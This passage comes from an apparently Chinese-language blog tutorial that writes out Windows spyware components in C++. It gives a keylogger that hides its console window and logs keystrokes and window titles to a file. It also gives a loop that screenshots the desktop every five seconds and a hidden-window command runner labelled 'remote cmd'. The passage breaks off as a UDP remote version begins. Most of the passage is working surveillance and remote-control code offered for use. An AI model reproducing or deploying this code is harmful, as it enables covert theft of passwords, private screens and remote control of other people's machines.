class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(VK_PROCESSKEY, <span class="string">&quot;Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE6</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE7</span>, <span class="string">&quot;Windows 2000/XP: Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information, see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE8</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE9</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xEA</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xEB</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xEC</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xED</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xEF</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xF0</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xF1</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xF2</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xF3</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xF4</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xF5</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(VK_ATTN, <span class="string">&quot;Attn key&quot;</span>),</span><br><span class="line">AddVKey(VK_CRSEL, <span class="string">&quot;CrSel key&quot;</span>),</span><br><span class="line">AddVKey(VK_EXSEL, <span class="string">&quot;ExSel key&quot;</span>),</span><br><span class="line">AddVKey(VK_EREOF, <span class="string">&quot;Erase EOF key&quot;</span>),</span><br><span class="line">AddVKey(VK_PLAY, <span class="string">&quot;Play key&quot;</span>),</span><br><span class="line">AddVKey(VK_ZOOM, <span class="string">&quot;Zoom key&quot;</span>),</span><br><span class="line">AddVKey(VK_NONAME, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(VK_PA1, <span class="string">&quot;PA1 key&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_CLEAR, <span class="string">&quot;Clear key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xFF</span>, <span class="string">&quot;Unknown Virtual-Key Code&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">LPCSTR <span class="title">GetKeyName</span><span class="params">(USHORT VKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(vkis); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (VKey == vkis[i].VKey)</span><br><span class="line"><span class="keyword">return</span> vkis[i].VKname;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> vkis[--i].VKname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Sava_Keyboard</span><span class="params">(LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">KBDLLHOOKSTRUCT sKB;</span><br><span class="line">sKB = (KBDLLHOOKSTRUCT)(*(KBDLLHOOKSTRUCT*)lParam);</span><br><span class="line">HWND hForegroundWindows;</span><br><span class="line"><span class="keyword">char</span> cKeyname[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> cTitle2[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> cText[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FILE* fp=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">fopen_s(&amp;fp, <span class="string">&quot;log.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fopen_s Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">hForegroundWindows=GetForegroundWindow();</span><br><span class="line">GetWindowTextA(hForegroundWindows, cTitle2, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(cTitle1, cTitle2))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(cText, <span class="string">&quot;\n[Windows - %s]\t\n&quot;</span>, cTitle2);</span><br><span class="line">fwrite(cText, <span class="built_in">strlen</span>(cText) + <span class="number">1</span>, <span class="number">1</span>, fp);</span><br><span class="line"><span class="built_in">memset</span>(cTitle1, <span class="number">0</span>, MAX_PATH);</span><br><span class="line"><span class="built_in">strcpy</span>(cTitle1, cTitle2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(cText, <span class="number">0</span>,MAX_PATH);</span><br><span class="line"><span class="built_in">strcpy</span>(cKeyname, GetKeyName(sKB.vkCode));</span><br><span class="line"><span class="built_in">sprintf</span>(cText, <span class="string">&quot;%s&quot;</span>, cKeyname);</span><br><span class="line">fwrite(cText, <span class="built_in">strlen</span>(cText), <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">LowLevelKeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)</span><br><span class="line">&#123;</span><br><span class="line">Sava_Keyboard(lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(<span class="literal">NULL</span>, nCode, wParam, lParam);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HHOOK hhk;</span><br><span class="line">HWND hWnd;</span><br><span class="line"></span><br><span class="line"><span class="comment">//隐藏窗口</span></span><br><span class="line">AllocConsole();</span><br><span class="line">hWnd = FindWindowA(<span class="string">&quot;ConsoleWindowClass&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hWnd)</span><br><span class="line">ShowWindow(hWnd, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置键盘记录HOOK</span></span><br><span class="line">hhk=SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(<span class="number">0</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span> (GetMessage(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">return</span> UnhookWindowsHookEx(hhk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意点就是ctitle1需要设置为全局变量，不能在函数中被重置。</p><h3 id="桌面截屏"><a href="#桌面截屏" class="headerlink" title="桌面截屏"></a>桌面截屏</h3><p>网上找到一段对DC的解释还比较通俗易懂的说法。</p><p>首先明白DC的含义，Windows不允许程序员直接访问硬件，它对屏幕的操作是通过环境设备,也就是DC来完成的。屏幕上的没一个窗口都对应一个DC,可以把DC想象成一个视频缓冲区，对这这个缓冲区的操作，会表现在这个缓冲区对应的屏幕窗口上。<br>在窗口的DC之外，可以建立自己的DC，就是说它不对应窗口，这个方法就是CreateCompatibleDC，这个DC就是一个内存缓冲区，通过这个DC你可以把和它兼容的窗口DC保存到这个DC中，就是说你可以通过它在不同的DC之间拷贝数据。例如：你先在这个DC中建立好数据，然后在拷贝到窗口的DC就是完成了这个窗口的刷新。</p><p>用通俗易懂的方式来讲讲过程。</p><ul><li>简单讲上下文DC理解为一块画布，然后可以根据窗口的句柄来获取窗口的DC，也就是GetDC()这个函数，并且相当于是有画了的画布。</li><li>但是我们为了复制这个画布的画，我们自己也要有一个画布，所以要创建兼容性DC，也就是CreateCompatibleDC()这个函数。</li><li>当然，画布肯定是需要规定大小之类的，所有有CreateCompatibleBitmap()函数，创建位图，位图又叫做点阵图，是一个个很小的颜色小方块组合在一起的图片。CreateCompatibleDC()函数也说了，在对DC(画布)绘画前，它必须将正确宽度和高度的位图选择到 DC 中。</li><li>然后如何传递位图给DC呢，就是用到SelectObject()函数。</li><li>之后就可以利用BitBlt原设备的上下文(画)复制到目标设备(我们的画布)。</li></ul><p>上面的部分就是复制的部分，下面来讲如何绘制鼠标的原理。</p><ul><li>实际上差不多，</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;atlimage.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ScreenWidth;</span><br><span class="line"><span class="keyword">int</span> ScreenHeight;</span><br><span class="line"><span class="function">BOOL <span class="title">GetNewTime</span><span class="params">(<span class="keyword">char</span> *sTime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">time_t</span> timep;</span><br><span class="line">time(&amp;timep);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span>* <span class="title">p</span>;</span></span><br><span class="line">p = gmtime(&amp;timep);</span><br><span class="line"><span class="built_in">sprintf</span>(sTime, <span class="string">&quot;%d-%d-%d %d %d %d&quot;</span>, <span class="number">1900</span> + p-&gt;tm_year, <span class="number">1</span> + p-&gt;tm_mon, p-&gt;tm_mday, <span class="number">8</span> + p-&gt;tm_hour, p-&gt;tm_min, p-&gt;tm_sec);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Save_to_jpg</span><span class="params">(HBITMAP hbmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CImage image;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">GetNewTime(buffer);</span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;.jpg&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">image.Attach(hbmp);</span><br><span class="line">image.Save(buffer);</span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line">remove(buffer);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">PaintMouse</span><span class="params">(HDC hdc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HDC bufdc = <span class="literal">NULL</span>;</span><br><span class="line">CURSORINFO cursorInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ICONINFO iconInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HBITMAP bmpOldMask = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">bufdc = ::CreateCompatibleDC(hdc);</span><br><span class="line">::RtlZeroMemory(&amp;iconInfo, <span class="keyword">sizeof</span>(iconInfo));</span><br><span class="line">cursorInfo.cbSize = <span class="keyword">sizeof</span>(cursorInfo);</span><br><span class="line"><span class="comment">// 获取光标信息</span></span><br><span class="line">::GetCursorInfo(&amp;cursorInfo);</span><br><span class="line"><span class="comment">// 获取光标图标信息</span></span><br><span class="line">::GetIconInfo(cursorInfo.hCursor, &amp;iconInfo);</span><br><span class="line"><span class="comment">// 绘制 白底黑鼠标(AND)</span></span><br><span class="line">bmpOldMask = (HBITMAP)::SelectObject(bufdc, iconInfo.hbmMask);</span><br><span class="line">::BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, <span class="number">20</span>, <span class="number">20</span>,</span><br><span class="line">bufdc, <span class="number">0</span>, <span class="number">0</span>, SRCAND);</span><br><span class="line"><span class="comment">//绘制 黑底彩色鼠标(OR)</span></span><br><span class="line">SelectObject(bufdc, iconInfo.hbmColor);</span><br><span class="line">BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, <span class="number">20</span>, <span class="number">20</span>,</span><br><span class="line">bufdc, <span class="number">0</span>, <span class="number">0</span>, SRCPAINT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">SelectObject(bufdc, bmpOldMask);</span><br><span class="line">DeleteObject(iconInfo.hbmColor);</span><br><span class="line">DeleteObject(iconInfo.hbmMask);</span><br><span class="line">DeleteDC(bufdc);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ScreenCapture</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hDesktopWnd;</span><br><span class="line">HDC hDc;</span><br><span class="line">HDC mDc;</span><br><span class="line">HBITMAP bmp;</span><br><span class="line">HGDIOBJ hobj;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取桌面窗口句柄</span></span><br><span class="line">hDesktopWnd=GetDesktopWindow();</span><br><span class="line"><span class="comment">//获取窗口DC</span></span><br><span class="line">hDc = GetDC(hDesktopWnd);</span><br><span class="line"><span class="comment">//创建兼容性DC</span></span><br><span class="line">mDc = CreateCompatibleDC(hDc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取屏幕长宽</span></span><br><span class="line">ScreenWidth = GetSystemMetrics(SM_CXSCREEN);</span><br><span class="line">ScreenHeight = GetSystemMetrics(SM_CYSCREEN);</span><br><span class="line"><span class="comment">//创建兼容位图</span></span><br><span class="line">bmp = CreateCompatibleBitmap(hDc, ScreenWidth, ScreenHeight);</span><br><span class="line"><span class="comment">//选中位图</span></span><br><span class="line">hobj=SelectObject(mDc, bmp);</span><br><span class="line"></span><br><span class="line">BitBlt(mDc, <span class="number">0</span>, <span class="number">0</span>, ScreenWidth, ScreenHeight, hDc, <span class="number">0</span>, <span class="number">0</span>, SRCCOPY);</span><br><span class="line">PaintMouse(mDc);</span><br><span class="line">Save_to_jpg(bmp);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//网上找到的比较简单的，实际上差不多意思。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ScreenShot</span><span class="params">(LPCTSTR s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HDC hdcSrc = GetDC(GetDesktopWindow());</span><br><span class="line"><span class="keyword">int</span> nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);</span><br><span class="line"><span class="keyword">int</span> nWidth = GetDeviceCaps(hdcSrc, HORZRES);</span><br><span class="line"><span class="keyword">int</span> nHeight = GetDeviceCaps(hdcSrc, VERTRES);</span><br><span class="line">CImage image;</span><br><span class="line">image.Create(nWidth, nHeight, nBitPerPixel);</span><br><span class="line">BitBlt(image.GetDC(), <span class="number">0</span>, <span class="number">0</span>, nWidth, nHeight, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, SRCCOPY);</span><br><span class="line">ReleaseDC(<span class="literal">NULL</span>, hdcSrc);</span><br><span class="line">image.ReleaseDC();</span><br><span class="line">image.Save(s, Gdiplus::ImageFormatPNG);<span class="comment">//ImageFormatJPEG</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">ScreenCapture();</span><br><span class="line">Sleep(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ScreenShot(&quot;hello.jpg&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就实现了不断截图和删除截图的操作了，注意字符集使用多字节字符集。</p><h2 id="远程cmd"><a href="#远程cmd" class="headerlink" title="远程cmd"></a>远程cmd</h2><p>我们知道通过一些函数比如说system，WinExec，CreateProcess，等是可以执行cmd命令的，但是有时候我们需要获取返回来的数据，也就执行完cmd命令，下方出现的数据，就可以利用到网络通信和管道的知识。</p><p>管道，用来进行进程间通信数据的，本质是一段内存共享。两个进程利用管道文件进行通信时，一个进程为写进程，另一个进程为读进程。写进程通过写端（发送端）往管道文件中写入信息；读进程通过读端（接收端）从管道文件中读取信息。</p><p>管道分为匿名管道和命名管道。</p><ul><li>匿名管道:管道是半双工的，数据只能单向通信；需要双方通信时，需要建立起两个管道；只能用于父子进程或者兄弟进程之间（具有亲缘关系的进程）。</li><li>命名管道：可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信。</li></ul><p>这里是用匿名管道实现的cmd返回数据通信，也就是CreatePipe函数，如果是命名管道则是CreateNamedPipe函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyRemoteCmd</span><span class="params">(<span class="keyword">char</span>* lpCommandLine, <span class="keyword">char</span>* buffer, DWORD buffersize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE  hReadPipe=<span class="literal">NULL</span>;</span><br><span class="line">HANDLE  hWritePipe=<span class="literal">NULL</span>;</span><br><span class="line">SECURITY_ATTRIBUTES securityattributes = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">STARTUPINFOA si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置SECURITY_ATTRIBUTES结构体属性。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">securityattributes.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line"><span class="comment">//可被创建的新进程继承句柄。</span></span><br><span class="line">securityattributes.bInheritHandle = TRUE;</span><br><span class="line">securityattributes.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;securityattributes, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreatePipe Failed!!! %d&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"><span class="comment">//隐藏窗口</span></span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<span class="comment">//STARTF_USESTDHANDLES这个代表指定是进程的标准输入输出句柄</span></span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line"><span class="comment">//设置输出句柄和标准错误句柄</span></span><br><span class="line">si.hStdOutput = hWritePipe;</span><br><span class="line">si.hStdError = hWritePipe;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置为继承句柄，将返回数据写入管道</span></span><br><span class="line">CreateProcessA(<span class="number">0</span>, lpCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="comment">//等待子进程结束</span></span><br><span class="line">WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用ReadFile读取管道数据，CreatePipe函数的评论也讲到利用ReadFile来读取数据</span></span><br><span class="line">ReadFile(hReadPipe, buffer, buffersize, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄 </span></span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line">CloseHandle(hWritePipe);</span><br><span class="line">CloseHandle(hReadPipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cmd[] = <span class="string">&quot;ipconfig&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> szBuffer[<span class="number">0x10000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwBufferSize = <span class="number">0x10000</span>;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, dwBufferSize);</span><br><span class="line">MyRemoteCmd(cmd, szBuffer, dwBufferSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, szBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就实现了用管道读取cmd命令ipconfig执行完成后返回的数据。当然还没有实现远程，当然实现远程也很简单，利用socket通讯，TCP或者UDP都行，接收到cmd命令的一方，直接进行管道通信，然后得到返回的数据，然后在发送出去。</p><p>代码入下，基于UDP协议，UDP通信感觉还是有点麻烦，和TCP各有优点吧。</p><p>按道理也应该分个命令发送端和命令执行端的，但是太麻烦了，我就没有分开写，但是给命令执行端分配了个发送命令执行完成后信息的端口2333，也就是命令发送端的端口。这样命令执行端如果想向命令发送端发送cmd命令是做不到的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 